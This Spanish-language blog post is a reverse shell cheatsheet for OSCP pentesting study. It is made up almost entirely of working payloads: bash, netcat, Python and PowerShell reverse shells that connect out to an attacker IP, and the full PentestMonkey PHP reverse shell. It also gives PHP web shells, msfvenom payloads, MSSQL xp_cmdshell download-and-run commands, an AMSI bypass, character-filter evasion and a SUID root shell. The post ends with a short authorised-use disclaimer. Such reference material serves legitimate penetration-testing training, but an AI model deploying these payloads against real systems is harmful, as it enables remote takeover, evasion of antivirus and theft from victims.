---
title: "Reverse Shells Cheatsheet - Guía Completa"
date: Thu Dec 12 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Reverse Shells]
tags: [reverse-shell, bash, python, php, powershell, netcat, meterpreter, rce, oscp, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-12-reverse-shells-cheatsheet.png
---

# Reverse Shells Cheatsheet - Guía Completa

## 🎯 Conceptos Fundamentales

### ¿Qué es una Reverse Shell?

Una **reverse shell** es una conexión de red donde la máquina víctima inicia la conexión hacia el atacante, permitiendo control remoto de la víctima.

**Flujo**:
1. Atacante crea listener en su máquina
2. Víctima ejecuta payload que conecta al atacante
3. Atacante obtiene shell interactiva

### Tipos de Shells

| Tipo | Descripción | Interactividad |
|------|-------------|----------------|
| **Non-Interactive** | Comando ejecuta, muestra output, termina | Mínima |
| **Semi-Interactive** | Mantiene conexión, pero sin TTY completa | Media |
| **Fully Interactive** | TTY completa, auto-completado, Ctrl+C, etc | Alta |

### Shell vs Reverse Shell

- **Shell (Bind)**: Víctima escucha puerto, atacante conecta
- **Reverse Shell**: Atacante escucha puerto, víctima conecta (bypasses firewalls)

**⚠️ Limitación de Bind Shell**: Firewalls bloquean conexiones entrantes. Reverse shells sortean esto.

**🎯 MITRE ATT&CK**: T1059 - Command and Scripting Interpreter

---

## 👂 Listeners

### NetCat (nc)

```bash
# Listener básico
nc -nlvp 4444

# Con rlwrap (permite historial y edición)
rlwrap nc -nlvp 4444

# Especificar interfaz
nc -nlvp 4444 -s 10.10.14.87

# IPv6
nc -6 -nlvp 4444
```

**Parámetros**:
- `-n`: No resolver DNS
- `-l`: Modo escucha (listen)
- `-v`: Verbose
- `-p`: Puerto

### Socat

```bash
# Listener básico
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Con TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Con SSL/TLS
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -
```

### Metasploit Multi Handler

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.50.1; set LPORT 443; run;"
```

**💡 Tip**: Usar puerto 443 (HTTPS) o 53 (DNS) ayuda a bypass firewalls.

---

## 🐚 Bash y Netcat

### Bash Basic

```bash
# Bash /dev/tcp
bash -i >& /dev/tcp/10.10.14.87/4444 0>&1

# Alternativa con exec
exec 5<>/dev/tcp/10.10.14.87/4444;cat <&5|bash>&5 2>&5
```

**URL Encoded** (para inyecciones):
```
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.87/4444+0>%261'
```

### MKFIFO

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.49 4444 >/tmp/f
```

**¿Qué es MKFIFO?** Crea un named pipe (FIFO = First In, First Out) para comunicación bidireccional.

### NetCat Traditional

```bash
# NetCat con -e (si está disponible)
nc -e /bin/bash 10.10.14.87 4444
nc -e /bin/sh 10.10.14.87 4444

# NetCat sin -e
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.87 4444 > /tmp/f

# NetCat con OpenBSD (no tiene -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.87 4444 >/tmp/f
```

### Desde URL/RCE Web

```http
# GET parameter
http://target.com/backdoor.php?command=bash -c 'bash -i >%26 /dev/tcp/10.10.14.87/4444 0>%261'

# URL encoded completo
backdoor.php?command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.87/4444+0>%261'
```

---

## 🐍 Python

### Python Basic

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Python con sh

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### Python Script Completo

```python
#!/usr/bin/env python
import socket
import subprocess

def reverse_shell():
    ip = "10.10.14.87"
    port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())

    s.close()

reverse_shell()
```

### Python con NetCat

Script que usa NetCat para enviar shell:

```python
#!/usr/bin/env python
import os
os.system('nc -e /bin/sh 10.10.14.87 4444')
```

---

## 🐘 PHP

### PHP PentestMonkey

La reverse shell PHP más popular y confiable:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.87';  // CAMBIAR ESTO
$port = 4444;         // CAMBIAR ESTO
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// Daemonise if possible
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);  // Parent exits
    }

    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

**Descarga**: [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

### PHP Oneliner

Útil cuando no podemos subir archivo PHP directamente:

```php
<?php system("wget http://10.10.14.87/shell.txt -O /tmp/shell.php; php /tmp/shell.php");?>
```

### PHP Simple Web Shell

Para casos donde necesitamos RCE simple:

```php
<?php system($_REQUEST['cmd']); ?>

<?php system($_GET['cmd']); ?>

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

**Uso**:
```http
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=cat /etc/passwd
```

---

## 💻 PowerShell

### PowerShell Basic

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.87",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### PowerShell Oneliner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.87',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell en Base64

#### Generar Base64

```powershell
# En PowerShell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.87",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText
```

#### Desde Linux

```bash
cat reverse_shell.ps1 | iconv -t utf-16le | base64 -w 0; echo
```

**⚠️ Importante**: El encoding debe ser **UTF-16LE** (Little Endian).

#### Ejecutar

```powershell
powershell -enc <BASE64_STRING>
```

### PowerShell en Python

Script que genera el comando completo:

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.201",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

---

## 🖥️ Windows (C/C++, Meterpreter)

### C/C++ Setuid Shell

Para escalar privilegios en Linux con binario SUID:

```c
// shell.c
int main(){
    setuid(0);
    system("/bin/bash -p");
}
```

**Compilar**:
```bash
# 32-bit
gcc -m32 shell.c -o shell

# 64-bit
gcc shell.c -o shell

# Establecer SUID
chmod +s shell
```

### Meterpreter Windows

```bash
# Generar payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > shell.exe

# Multi handler
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

**Meterpreter Features**:
- `sysinfo`: Información del sistema
- `getuid`: Usuario actual
- `getsystem`: Intentar elevar a SYSTEM
- `hashdump`: Extraer hashes SAM
- `screenshot`: Captura de pantalla
- `keyscan_start`: Iniciar keylogger
- `migrate PID`: Migrar a otro proceso

---

## 🗄️ MSSQL Server

### Habilitar xp_cmdshell

```sql
SP_CONFIGURE "show advanced options", 1
RECONFIGURE
SP_CONFIGURE "xp_cmdshell", 1
RECONFIGURE
```

### Reverse Shell desde MSSQL

```sql
-- Con NetCat previamente subido
xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.14.87 443"

-- Con PowerShell
xp_cmdshell "powershell -enc <BASE64_PAYLOAD>"

-- Descargar y ejecutar
xp_cmdshell "certutil -urlcache -f http://10.10.14.87/nc.exe C:\Temp\nc.exe"
xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.14.87 443"
```

### Listener

```bash
rlwrap nc -nlvp 443
```

---

## ⚙️ ELF Binaries

### Crear Reverse Shell ELF

```bash
# Generar con msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4343 -f elf > shell.elf

# Dar permisos de ejecución
chmod +x shell.elf

# Ejecutar
./shell.elf
```

### Uso con Java Debug Wire Protocol (JDWP)

```bash
python2.7 jdwp.py -t 127.0.0.1 -p 8000 --break-on "java.lang.String.indexOf" --cmd "/home/dev/shell.elf"
```

---

## 🎭 Evasión y Ofuscación

### Ofuscación de Payloads

#### Bash

```bash
# Usar variables
IP=10.10.14.87
PORT=4444
bash -i >& /dev/tcp/$IP/$PORT 0>&1

# Base64
echo "bash -i >& /dev/tcp/10.10.14.87/4444 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ny80NDQ0IDA+JjEK

# Ejecutar
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ny80NDQ0IDA+JjEK | base64 -d | bash
```

#### PowerShell

```powershell
# Bypass Execution Policy
powershell -ep bypass -c "comando"

# Hidden window
powershell -nop -w hidden -c "comando"

# Bypass AMSI (AntimalwareScriptInterface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Bypass de Caracteres Restringidos

```bash
# Si '/' está bloqueado
${HOME}  # Expande a /home/user o /root
${PATH:0:1}  # Primer carácter de PATH (/)

# Ejemplo
cat${IFS}${HOME}etc${HOME}passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

### Reverse Shell sin Espacios

```bash
# Usando {IFS}
bash{IFS}-c{IFS}'bash{IFS}-i{IFS}>&{IFS}/dev/tcp/10.10.14.87/4444{IFS}0>&1'

# Usando $IFS
bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.14.87/4444$IFS0>&1'
```

---

## 🔄 Upgrading Shells

### TTY Shell con Python

```bash
# Obtener TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background shell
Ctrl+Z

# En máquina local
stty raw -echo; fg

# En shell remota
export TERM=xterm
export SHELL=/bin/bash
```

### Alternativas para TTY

```bash
# Con script
/usr/bin/script -qc /bin/bash /dev/null

# Con socat (requiere subir socat)
# En atacante
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En víctima
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.87:4444
```

---

## 🎓 Tips para OSCP

### Checklist de Reverse Shell

- [ ] Identificar sistema operativo (Linux/Windows)
- [ ] Verificar qué intérpretes están disponibles (python, php, perl, etc)
- [ ] Probar payload básico primero
- [ ] Si falla, intentar alternativas
- [ ] Ofuscar si hay WAF/IDS
- [ ] Upgrade shell a TTY completa
- [ ] Establecer persistencia

### Comandos Rápidos

```bash
# Generar payloads rápidamente
msfvenom -l payloads | grep reverse
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Listeners
nc -nlvp 443
rlwrap nc -nlvp 443
socat TCP-LISTEN:443,reuseaddr FILE:`tty`,raw,echo=0
```

### Troubleshooting

**No recibo conexión**:
- Verificar firewall local (`sudo ufw status`)
- Verificar IP correcta (`ip a`, `ifconfig`)
- Verificar puerto no está en uso (`sudo lsof -i:4444`)
- Probar puerto diferente (80, 443, 53)

**Shell muere inmediatamente**:
- Verificar sintaxis del payload
- Probar con `bash -c` para evitar problemas de escape
- Revisar logs de la aplicación

**Caracteres extraños en shell**:
- Problema de codificación
- Usar `export TERM=xterm`
- Upgrade a TTY completa

---

## 📚 Referencias

### Generadores de Shells

- [Reverse Shell Generator](https://www.revshells.com/) - ⭐ LA MEJOR
- [RevShells](https://github.com/0dayCTF/reverse-shell-generator)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### Recursos

- [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

### Herramientas

- [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Netcat](https://sourceforge.net/projects/netcat/)
- [Socat](https://repo.or.cz/socat.git)

---

**Última actualización**: 2025-12-12
**Licencia**: Creative Commons BY-NC-SA 4.0

**⚠️ Disclaimer**: Usar solo en entornos autorizados. El uso no autorizado es ilegal.
